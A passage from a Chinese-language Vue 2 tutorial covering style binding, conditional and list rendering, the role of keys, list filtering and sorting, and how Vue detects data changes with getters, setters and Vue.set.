[&#x27;happy&#x27;, &#x27;sad&#x27;, &#x27;normal&#x27;]; // Math.floor(Math.random()*3); //随机生成[0,1的小数)，随后floor向下取整 this.mood = arr[Math.floor(Math.random() * 3)]; &#125; &#125; ##### 数组写法 适用于：要绑定的样式个数不确定，名字也不确定时。 数组中的样式可以动态删除（shift可以删除数组首个元素），也可以动态添加（push可以向数组末尾添加元素） ##### 对象写法 适用于要绑定的样式个数确定，名称也确定，但要动态决定是否使用的情况 #### 绑定style样式 ##### 对象写法 代码美化： 123456789101112131415161718&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;basic&quot; :style&#x3D;&quot;styleObj&quot;&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; site: &#39;miketaylorjuly123.cn&#39;, styleObj:&#123; fontSize: &#39;40px&#39; &#125; &#125; &#125;)&lt;&#x2F;script&gt; 指定style的对象中，原来使用`-`连接的属性名，使用驼峰命名法。 ##### 数组写法 本质上还是对象写法，只不过使用数组包含了多个对象而已。 写法一： 12345678910111213141516171819202122&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div class&#x3D;&quot;basic&quot; :style&#x3D;&quot;[styleObj,styleObj2]&quot;&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; site: &#39;miketaylorjuly123.cn&#39;, styleObj:&#123; fontSize: &#39;40px&#39; &#125;, styleObj2:&#123; backgroundColor: &#39;#8080ff&#39;, color: &#39;cyan&#39; &#125; &#125; &#125;)&lt;&#x2F;script&gt; 写法二 123456789101112131415new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; site: &#x27;miketaylorjuly123.cn&#x27;, styleArr: [ &#123; fontSize: &#x27;40px&#x27; &#125;, &#123; backgroundColor: &#x27;#8080ff&#x27;, color: &#x27;cyan&#x27; &#125; ] &#125; &#125;) #### 总结 * class样式： * 写法:class=\"xxx\"，xxx可以是字符串、对象、数组 * 字符串写法适用于：类名不确定，要动态获取 * 数组写法适用于：要绑定多个样式，个数不确定，名字也不确定 * 对象写法适用于：要绑定多个样式，个数确定，名字也确定，只是不确定是否使用的情况。 * style样式： * :style = \"fontSize: xxx\"，其中xxx是动态值 * :style=\"[a,b]\"，其中a,b是样式对象 ### 1.19 Vue中的条件渲染 #### v-show 123456789101112131415&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div v-show&#x3D;&quot;a&quot;&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; a: false &#125; &#125;)&lt;&#x2F;script&gt; 使用v-show后，不展示的DOM元素未被移除，仅仅是使用样式隐藏了该DOM结构，底层实现是`display:none;` v-show的缺点：不能设置显示隐藏的过渡效果。 #### v-if 123456789101112131415&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div v-if&#x3D;&quot;a&quot;&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; a: false &#125; &#125;)&lt;&#x2F;script&gt; 将该不展示的DOM元素直接移除。 除开v-if，还有：v-else-if、v-else(后面不用带表达式，会自动默认执行)，可以配合v-if使用，和JS中使用方式类似，但是要求逻辑结构不能被打断。 123&lt;div v-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;&lt;div v-else-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;&lt;div v-else&gt;???&lt;&#x2F;div&gt; 在逻辑中有其他节点，逻辑会被打断，例如： 1234&lt;div v-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;&lt;div&gt;@@@&lt;&#x2F;div&gt; &lt;div v-else-if&#x3D;&quot;xxx&quot;&gt;???&lt;&#x2F;div&gt;&lt;div v-else&gt;???&lt;&#x2F;div&gt; 控制台有如下报错： 注意区分： 123&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;&lt;div v-else-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;React&lt;&#x2F;div&gt;&lt;div v-else-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt; 123&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;React&lt;&#x2F;div&gt;&lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt; 注意：使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到。 #### 简单案例 效果 如果节点变化很频繁，最好使用v-show，因为v-show代表节点仍然存在，vue只是动态控制隐藏和显示；v-if效率较低，变化频率低时使用。 ##### v-show实现 123456789101112131415161718192021&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt; &lt;h2&gt;当前的n值：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;n++&quot;&gt;点击n++&lt;&#x2F;button&gt; &lt;div v-show&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt; &lt;div v-show&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;2&quot;&gt;React&lt;&#x2F;div&gt; &lt;div v-show&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; n:0 &#125; &#125;)&lt;&#x2F;script&gt; ##### v-if实现 123456789101112131415161718192021&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;div&gt;miketaylorjuly123.cn&lt;&#x2F;div&gt; &lt;h2&gt;当前的n值：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;n++&quot;&gt;点击n++&lt;&#x2F;button&gt; &lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt; &lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;2&quot;&gt;React&lt;&#x2F;div&gt; &lt;div v-if&#x3D;&quot;n%3 &#x3D;&#x3D;&#x3D;0&quot;&gt;Vue&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; n:0 &#125; &#125;)&lt;&#x2F;script&gt; #### template template就是模板的意思，使用它的好处是不会影响页面结构。 template只能和`v-if`配合使用，不能和v-show配合使用。 123456&lt;!--v-if与template配合使用--&gt;&lt;template v-if&#x3D;&quot;n &#x3D;&#x3D;&#x3D; 1 &quot;&gt;&lt;h2&gt;miketaylorjuly123.cn&lt;&#x2F;h2&gt;&lt;h2&gt;张加林&lt;&#x2F;h2&gt;&lt;h2&gt;20岁&lt;&#x2F;h2&gt;&lt;&#x2F;template&gt; ### 1.20 列表渲染 #### 遍历数组 1234567891011121314151617181920212223242526272829&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;p in persons&quot;&gt;&#123;&#123;p&#125;&#125;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; persons: [&#123; id: &#39;001&#39;, name: &#39;张三&#39;, age: 18 &#125;, &#123; id: &#39;002&#39;, name: &#39;李四&#39;, age: 19 &#125;, &#123; id: &#39;001&#39;, name: &#39;王五&#39;, age: 20 &#125;] &#125; &#125;)&lt;&#x2F;script&gt; 123&lt;ul&gt; &lt;li v-for&#x3D;&quot;p in persons&quot;&gt;&#123;&#123;p.name&#125;&#125;--&#123;&#123;p.age&#125;&#125;&lt;&#x2F;li&gt;&lt;&#x2F;ul&gt; 1234567&lt;ul&gt; &lt;li v-for&#x3D;&quot;(a,b,c) in persons&quot; :key&#x3D;&quot;a.id&quot;&gt; &lt;!--a,b in persons也可以，但是最好加()--&gt; &lt;!--(a,b) of persons也支持--&gt; &#123;&#123;a&#125;&#125;---------&#123;&#123;b&#125;&#125;---------&#123;&#123;c&#125;&#125; &lt;&#x2F;li&gt;&lt;&#x2F;ul&gt; 效果： 这里，a是数组中的一项，b是数组索引值 #### 遍历对象 1234567891011121314151617181920212223&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(value,key) in car&quot;&gt; &#123;&#123;value&#125;&#125; ---------- &#123;&#123;key&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data:&#123; car:&#123; name: &#39;迈巴赫&#39;, price: &#39;800W&#39;, color: &#39;深蓝&#39; &#125; &#125; &#125;)&lt;&#x2F;script&gt; #### 遍历字符串 不常用 12345678910111213141516171819&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(char,index) in str&quot;&gt; &#123;&#123;char&#125;&#125;----------&#123;&#123;index&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; str: &#39;miketaylorjuly123.cn&#39; &#125; &#125;)&lt;&#x2F;script&gt; #### 遍历指定次数 不常用 12345678910&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(number,index) in 6&quot;&gt; &#123;&#123;number&#125;&#125;-------&#123;&#123;index&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt; #### key的作用与原理 12345&lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :key&#x3D;&quot;p.id&quot;&gt; &#123;&#123;p&#125;&#125;-------&#123;&#123;p.age&#125;&#125; &lt;&#x2F;li&gt;&lt;&#x2F;ul&gt; vue将它转换为真实DOM时，将key征用，不在真实DOM上展示。下面验证： 12345&lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :a&#x3D;&quot;p.id&quot;&gt; &#123;&#123;p&#125;&#125;-------&#123;&#123;p.age&#125;&#125; &lt;&#x2F;li&gt;&lt;&#x2F;ul&gt; ##### 出错案例 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :key&#x3D;&quot;p.id&quot;&gt; &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; &lt;input type&#x3D;&quot;text&quot;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;button @click.once&#x3D;&quot;add&quot;&gt;添加人员&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; persons: [&#123; id: &#39;001&#39;, name: &#39;张三&#39;, age: 18 &#125;, &#123; id: &#39;002&#39;, name: &#39;李四&#39;, age: 19 &#125;, &#123; id: &#39;003&#39;, name: &#39;王五&#39;, age: 20 &#125;] &#125;, methods:&#123; add()&#123; const p &#x3D; &#123; id:&quot;004&quot;, name:&#39;张加林&#39;, age:20 &#125;; this.persons.unshift(p); &#125; &#125;, &#125;)&lt;&#x2F;script&gt; 改正： | key | T/F | | ----- | ---- | | index | F | | none | F | | id | T | 注：v-for遍历列表，没有写key，Vue默认将遍历时的索引值自动作为key。 ##### 原理详解 对数据进行了如上破坏顺序的操作，那么key就可能引发上述问题。 对比的是虚拟DOM，输入框中输入的临时数据在真实DOM中，所以比对时只是考虑DOM节点是否一致。 对比结果为不同时，无法复用，将新的DOM重新转为真实DOM节点。 对比结果相同，DOM节点复用。 ![image-20210902101929970](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902101929970.png) ![image-20210902102252854](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902102252854.png) ##### 面试题 react、vue中的key有什么作用？（key的内部原理） * 虚拟DOM的作用： * key是虚拟DOM对象的标记，当数据发生变化，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下： * 旧虚拟DOM中未找到与新虚拟DOM相同的key： * 若虚拟DOM中内容没变，直接使用之前的真实DOM * 若虚拟DOM中的内容变了，则生成新的真实DOM，随后替换掉页面之前的真实DOM * 旧虚拟DOM中未找到与新虚拟DOM相同的key * 创建新的真实DOM，随后渲染到页面 用index作为key可能引发的问题： * 如果对数据进行：逆序添加、逆序删除等破坏顺序等操作： * 会产生没有必要的真实DOM的更新==> 界面有问题 开发中如何选择key？ * 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值 * 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表展示，使用index作为key是没有任何问题的。 ### 1.21 列表过滤 #### 效果 ![31](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/31.gif) #### 回顾JS数组知识 ##### indexOf() ![image-20210902151923250](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902151923250.png) * **注意：** * indexOf() 方法对大小写敏感！ * 如果要检索的字符串值没有出现，则该方法返回 -1。 * 当indexOf用于匹配空字符串时：，即：任何字符串使用indexOf与空字符串进行匹配时，都会返回0，即匹配成功。 ##### fliter() ![image-20210902151754774](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902151754774.png) filter() 方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。 * **注意：** * filter() 不会对空数组进行检测。 * filter() 不会改变原始数组。 ##### sort() * sort() 方法用于对数组的元素进行排序。 * 排序顺序可以是字母或数字，并按升序或降序。 * 默认排序顺序为按字母升序。 * **注意：**当数字是按字母顺序排列时\"40\"将排在\"5\"前面。 * 使用数字排序，你必须通过一个函数作为参数来调用。 * 函数指定数字是按照升序还是降序排列。 * **注意：** 这种方法会改变原始数组！。 #### 侦听属性实现 123456789101112131415161718192021222324252627282930313233343536373839&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keywords&quot; placeholder&#x3D;&quot;输入关键词&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in filpersons&quot; :key&#x3D;&quot;index&quot;&gt; &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; keywords: &#39;&#39;, persons: [ &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 20, gender: &#39;女&#39; &#125;, &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;, &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;, &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;], filpersons: [] &#125;, watch: &#123; keywords: &#123; handler(newValue) &#123; immediate: true; this.filpersons &#x3D; this.persons.filter((p) &#x3D;&gt; &#123; &#x2F;&#x2F; 函数体 &#x2F;&#x2F; return 过滤条件 console.log(newValue); return p.name.indexOf(newValue) !&#x3D;&#x3D; -1; &#125;); &#125; &#125; &#125; &#125;)&lt;&#x2F;script&gt; 小技巧：如何在vscode中实现注释可折叠 #### 计算属性实现 123456789101112131415161718192021222324252627282930313233&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keywords&quot; placeholder&#x3D;&quot;输入关键词&quot;&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in filpersons&quot; :key&#x3D;&quot;index&quot;&gt; &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; keywords: &#39;&#39;, persons: [ &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 20, gender: &#39;女&#39; &#125;, &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;, &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;, &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;], &#125;, computed: &#123; filpersons() &#123; return this.persons.filter((p) &#x3D;&gt; &#123; console.log(this.keywords); return p.name.indexOf(this.keywords) !&#x3D;&#x3D; -1; &#125;); &#125; &#125; &#125;)&lt;&#x2F;script&gt; ### 1.22 列表排序 案例效果： ![32](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/32.gif) 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keywords&quot; placeholder&#x3D;&quot;输入关键词&quot;&gt; &lt;button @click&#x3D;&quot;sortType &#x3D; 2&quot;&gt;年龄升序&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;sortType &#x3D; 1&quot;&gt;年龄降序&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;sortType &#x3D; 0&quot;&gt;原顺序&lt;&#x2F;button&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in filpersons&quot; :key&#x3D;&quot;p.id&quot;&gt; &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; keywords: &#39;&#39;, sortType: &#39;&#39;, &#x2F;&#x2F; 0-原顺序，1-降序，2-升序 persons: [ &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 34, gender: &#39;女&#39; &#125;, &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;, &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;, &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;], &#125;, computed: &#123; filpersons() &#123; const arr &#x3D; this.persons.filter((p) &#x3D;&gt; &#123; console.log(this.keywords); return p.name.indexOf(this.keywords) !&#x3D;&#x3D; -1; &#125;); &#x2F;&#x2F; 判断是否需要排序 if (this.sortType) &#123; arr.sort((p1, p2) &#x3D;&gt; &#123; &#x2F;&#x2F; 这里p1、p2是数组中的元素——对象 return this.sortType &#x3D;&#x3D;&#x3D; 1 ? p2.age - p1.age : p1.age - p2.age; &#125;) &#125; return arr; &#125; &#125; &#125;)&lt;&#x2F;script&gt; 注意：当sortType发生变化时由于filpersons是计算属性，filpersons也会跟着变化。 ### 1.23 Vue监测数据改变原理 #### 更新时的一个问题 ##### 没有问题 12345678910111213141516171819202122232425262728293031&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;button @click&#x3D;&quot;updateMei&quot;&gt;更新马冬梅&lt;&#x2F;button&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :key&#x3D;&quot;index&quot;&gt; &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; persons: [ &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 34, gender: &#39;女&#39; &#125;, &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;, &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;, &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;], &#125;, methods:&#123; updateMei()&#123; this.persons[0].name &#x3D; &#39;马老师&#39;; &#x2F;&#x2F; 奏效 this.persons[0].age&#x3D;50; &#x2F;&#x2F; 奏效 this.persons[0].gender &#x3D; &#39;男&#39;; &#x2F;&#x2F; 奏效 &#125; &#125; &#125;)&lt;&#x2F;script&gt; ##### 出现问题 直接使用对象赋值更改数据时，vue无法监测信息修改，但是信息已经更改了 #### Vue监测对象数据原理 ##### 回顾数据代理 ![image-20210902221205434](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902221205434.png) ##### 模拟数据监测 ###### 错误代码分析 回顾setInterval() 错误代码一 1234567891011121314&lt;script&gt; let data = &#123; name: &#x27;张加林&#x27;, site: &#x27;miketaylorjuly123.cn&#x27; &#125;;let tmp = &#x27;张加林&#x27;;setInterval(()=&gt;&#123; if(data.name !== tmp)&#123; tmp = data.name console.log(&#x27;name被修改&#x27;); &#125;&#125;,100)// 定时器开死，不可能这样实现&lt;/script&gt; 错误代码二 此时的name，既无法读取，也无法修改，报错：栈溢出 原因：读取或修改name时，出现了死循环。以读取为例，当读取name时，需要调用调用getter，而return时又需要读取name，不断迭代，产生了死循环，setter也同理。 ###### 正确设计思路(重难点) 123456789101112131415161718192021222324252627282930&lt;script&gt; let data = &#123; name: &#x27;张加林&#x27;, site: &#x27;miketaylorjuly123.cn&#x27; &#125;; // 创建一个监视的实例对象，用于监视data中属性的变化 const obs = new Observer(data); console.log(obs); // 准备一个vm实例对象 let vm = &#123;&#125;; vm._data = data = obs; // 能接收一个对象为参数，创建一个监视的实例对象 function Observer(obj) &#123; // 汇总对象中所有的属性，形成一个数组 const keys = Object.keys(obj); // 遍历 keys.forEach(((k)=&gt;&#123; Object.defineProperty(this,k,&#123; get()&#123; return obj[k]; &#125;, set(val)&#123; console.log(`$&#123;k&#125;被更改了，接下来将解析模板，生成虚拟DOM，……`); obj[k] = val; &#125; &#125;) &#125;)) &#125;&lt;/script&gt; 此处this是Observer的实例对象。 下面是代码效果： 当然，真正的Vue框架源代码复杂得多，功能也更加强大多元。 此处代码的缺憾： 此处b没有了getter和setter，因为只考虑了处理了一层。 Vue中： 哪怕是在数组中，也能找到对象。 Vue底层使用了递归了实现处理的逻辑，可以无限向内查找并处理，只要它是对象均能处理后添加getter和setter。 #### Vue.set()方法 需求：给student添加一个新的属性gender。 * 注意： 这样并不会报错，虽然student.age不存在。 * 读取一个对象中不存在的属性值时，返回的是underfined所以不会报错。而underfined值不会被展示到页面上。 * a不存在，读取a--------报错 * a存在，b不存在，读取b--------不报错 错误方法一 错误方法二 1vm.gender = &#x27;男&#x27; 原因：错得更加离谱，直接给vm添加属性gender，对数据代理机制不了解，因为gender属性会直接出现在vm实例上，本质上是因为vue先从data读取到gender，然后进行了数据代理，最后才会出现在vm实例上，直接添加属性值，相当于没有数据代理的步骤，不可能会出现getter和setter。 正解 1234567891011121314151617181920212223242526&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; collage:&#39;UESTC&#39;, student: &#123; name: &#39;张加林&#39;, site: &#39;miketaylorjuly123.cn&#39;, age:20, friends: [ &#123;name:&#39;jerry&#39;,age:20&#125;, &#123;name:&#39;mike&#39;,age:21&#125;, &#123;name:&#39;tony&#39;,age:30&#125; ] &#125; &#125;, methods:&#123; addGender()&#123; &#x2F;&#x2F; Vue.set(this.student,&#39;gender&#39;,&#39;男&#39;); this.$set(this.student,&#39;gender&#39;,&#39;男&#39;); &#125; &#125; &#125;)&lt;&#x2F;script&gt; 实现： 1234567891011121314151617181920212223242526&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; collage:&#39;UESTC&#39;, student: &#123; name: &#39;张加林&#39;, site: &#39;miketaylorjuly123.cn&#39;, age:20, friends: [ &#123;name:&#39;jerry&#39;,age:20&#125;, &#123;name:&#39;mike&#39;,age:21&#125;, &#123;name:&#39;tony&#39;,age:30&#125; ] &#125; &#125;, methods:&#123; addGender()&#123; &#x2F;&#x2F; Vue.set(this.student,&#39;gender&#39;,&#39;男&#39;); this.$set(this.student,&#39;gender&#39;,&#39;男&#39;); &#125; &#125; &#125;)&lt;&#x2F;script&gt; ##### 局限性 ![image-20210903100546254](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903100546254.png) 说明Vue.set()只能给Vue中的某一个对象添加属性，而不能给data/Vue实例添加属性。 #### Vue监测数组数据原理 没有为数组服务的getter和setter，所以当你按照数组索引修改hobby数组时，就会出现数据被更改，Vue未监测到的情况，下面是效果： 数组中每一个元素不是靠setter和getter来实现监视的。 Vue能监测到数组被修改的修改数组方法： * push * pop * shift * unshift * splice：指定位置插入元素，或删除元素，或替换指定位置的某个元素 * sort：排序 * reverse：反转数组 解决更新时问题： 1this.persons.splice(0,1,&#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,gender:&#x27;男&#x27;&#125;) Vue如何监测到调用了push/pop/shift/unshift：**包装技术** Vue上调用的上述七个方法已经不是原来`Array.prototype`上的方法了。 hobby数组被Vue管理，Vue中的push不再是正常原型上的push。 注意：由于 JavaScript 的限制，Vue **不能检测**数组和对象的变化。 第二种能被Vue监测到的修改数组的方法：使用Vue.set()方法 #### 总结 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;学生信息&lt;&#x2F;h2&gt; &lt;h3&gt;姓名：&#123;&#123;student.name&#125;&#125;&lt;&#x2F;h3&gt; &lt;h3&gt;年龄：&#123;&#123;student.age&#125;&#125;&lt;&#x2F;h3&gt;&lt;button @click&#x3D;&quot;student.age++&quot;&gt;年龄++&lt;&#x2F;button&gt; &lt;h2 v-if&#x3D;&quot;student.gender&quot;&gt;性别：&#123;&#123;student.gender&#125;&#125;&lt;&#x2F;h2&gt; &lt;button 